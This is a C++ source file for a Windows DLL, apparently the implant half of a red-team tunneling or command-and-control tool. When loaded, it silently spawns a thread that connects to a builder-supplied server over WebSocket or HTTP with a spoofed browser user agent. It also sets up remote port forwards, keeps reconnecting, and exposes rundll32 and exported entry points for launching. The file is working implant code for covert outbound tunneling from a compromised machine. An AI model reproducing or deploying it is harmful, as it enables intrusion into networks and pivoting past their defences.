#include "crypto.h"
#include "message.h"
#include "messenger_client.h"
#include "websocket_messenger_client.h"
#include "http_messenger_client.h"
#include "remote_port_forwarder.h"

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include <chrono>
#include <iostream>
#include <memory>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

// Builder-hardcoded defaults (replaced by builder.py)
static const std::string DEFAULT_SERVER_URL  = "{{ server_url }}";
static const std::string DEFAULT_ENCRYPTION_KEY = "{{ encryption_key }}";
static const std::string DEFAULT_REMOTE_PORT_FORWARDS = "{{ remote_port_forwards }}";
static const std::string DEFAULT_USER_AGENT = "{{ user_agent }}";
static const int DEFAULT_RETRY_ATTEMPTS = {{ retry_attempts }};
static const double DEFAULT_RETRY_DURATION = {{ retry_duration }};

static bool is_placeholder(const std::string& s) {
    return s.size() >= 5 && s[0] == '{' && s[1] == '{' && s[s.size()-1] == '}' && s[s.size()-2] == '}';
}

static std::vector<std::string> parse_forwards(const std::string& raw) {
    std::vector<std::string> result;
    if (raw.empty() || is_placeholder(raw)) return result;
    std::istringstream iss(raw);
    std::string token;
    while (iss >> token) {
        result.push_back(token);
    }
    return result;
}

static const std::string FALLBACK_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36";

static void run(const std::string& uri_arg, const std::string& key_arg,
                const std::vector<std::string>& remote_port_forwards,
                const std::string& user_agent,
                int retry_attempts, double retry_duration) {
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        return;
    }

    std::vector<uint8_t> encryption_key = Crypto::hash(key_arg);

    std::string uri = uri_arg;
    while (!uri.empty() && uri.back() == '/') {
        uri.pop_back();
    }

    std::vector<std::string> attempts;
    auto pos = uri.find("://");
    if (pos != std::string::npos) {
        std::string schemes = uri.substr(0, pos);
        uri = uri.substr(pos + 3);

        std::istringstream stream(schemes);
        std::string scheme;
        while (std::getline(stream, scheme, '+')) {
            attempts.push_back(scheme);
        }
    } else {
        attempts = {"ws", "http", "wss", "https"};
    }

    // Initial connection: try each scheme, first success wins
    std::unique_ptr<MessengerClient> client;

    for (const auto& attempt : attempts) {
        std::string url = attempt + "://" + uri;

        try {
            if (attempt.find("ws") != std::string::npos) {
                client = std::make_unique<WebSocketMessengerClient>(url, encryption_key, user_agent);
            } else if (attempt.find("http") != std::string::npos) {
                client = std::make_unique<HTTPMessengerClient>(url, encryption_key, user_agent);
            } else {
                continue;
            }

            client->connect();
            break;
        } catch (...) {
            client.reset();
            continue;
        }
    }

    if (!client) {
        WSACleanup();
        return;
    }

    // Start remote port forwarders (once, they hold a reference to client)
    for (const auto& config : remote_port_forwards) {
        auto forwarder = std::make_unique<RemotePortForwarder>(*client, config);
        std::thread([f = std::move(forwarder)]() { f->start(); }).detach();
    }

    // Run the message loop (blocks until disconnect)
    try {
        client->start();
    } catch (...) {}

    // Reconnection loop
    if (retry_attempts <= 0) {
        WSACleanup();
        return;
    }

    int attempts_count = 1;
    double sleep_time = retry_duration / retry_attempts;

    while (attempts_count <= retry_attempts) {
        std::this_thread::sleep_for(
            std::chrono::milliseconds(static_cast<int>(sleep_time * 1000)));

        try {
            client->connect();
            attempts_count = 1; // reset on successful reconnect
            client->start();    // blocks until next disconnect
        } catch (...) {
            attempts_count++;
        }
    }

    WSACleanup();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        // Only auto-connect if builder has baked in config
        if (!DEFAULT_ENCRYPTION_KEY.empty() && !is_placeholder(DEFAULT_ENCRYPTION_KEY)) {
            std::thread([]() {
                auto forwards = parse_forwards(DEFAULT_REMOTE_PORT_FORWARDS);
                std::string ua = is_placeholder(DEFAULT_USER_AGENT) ? FALLBACK_USER_AGENT : DEFAULT_USER_AGENT;
                run(DEFAULT_SERVER_URL, DEFAULT_ENCRYPTION_KEY, forwards, ua,
                    DEFAULT_RETRY_ATTEMPTS, DEFAULT_RETRY_DURATION);
            }).detach();
        }
    }
    return TRUE;
}

// rundll32 entry point
// Usage: rundll32 messenger-client-cpp.dll,Run <uri> <encryption_key> [forwards...]
extern "C" __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    std::string cmdline(lpszCmdLine);
    std::istringstream iss(cmdline);
    std::vector<std::string> args;
    std::string token;

    while (iss >> token) {
        args.push_back(token);
    }

    if (args.size() < 2) {
        return;
    }

    std::string uri = args[0];
    std::string key = args[1];
    std::vector<std::string> forwards(args.begin() + 2, args.end());

    run(uri, key, forwards, FALLBACK_USER_AGENT, 5, 60.0);
}

// Programmatic entry points
extern "C" __declspec(dllexport) void Execute(const char* uri, const char* encryption_key,
                                               const char* user_agent) {
    std::string ua = (user_agent && user_agent[0]) ? user_agent : FALLBACK_USER_AGENT;
    std::thread([u = std::string(uri), k = std::string(encryption_key), a = std::move(ua)]() {
        run(u, k, {}, a, 5, 60.0);
    }).detach();
}

extern "C" __declspec(dllexport) void ExecuteWithForwards(
    const char* uri, const char* encryption_key, const char* user_agent,
    const char** forwards, int forward_count
) {
    std::string ua = (user_agent && user_agent[0]) ? user_agent : FALLBACK_USER_AGENT;
    std::vector<std::string> fwds;
    for (int i = 0; i < forward_count; i++) {
        fwds.emplace_back(forwards[i]);
    }
    std::thread([u = std::string(uri), k = std::string(encryption_key), a = std::move(ua), f = std::move(fwds)]() {
        run(u, k, f, a, 5, 60.0);
    }).detach();
}
